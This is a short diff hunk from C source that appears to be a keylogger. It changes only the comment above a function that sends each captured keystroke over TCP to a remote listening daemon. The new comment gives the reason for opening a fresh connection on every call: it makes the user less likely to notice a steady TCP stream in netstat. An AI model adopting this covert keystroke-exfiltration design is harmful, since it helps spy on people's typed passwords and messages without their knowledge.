@@ -294,10 +294,11 @@ void fatal(const char * msg){
 }
 
 /**
- * transmit keystroke to a remote host, where a daemon in listening mode
- * is required to be running. The connection is established upon every
- * keystroke, which is inefficient, but causes less problems; permanent
- * connection should be tested here.
+ * Transmit keystroke to a remote host, where some daemon is required to listen
+ * at the given port. The TCP connection is newly established upon every call
+ * to this function; this is inefficient, but also offers advantages (e.g.,
+ * chances are lower that the user will see a constant TCP stream in netstat
+ * output, etc).
  * */
 int transmit_keystroke_inet(char* key, struct opts_struct *opts){
 	int sock, bytes_sent;
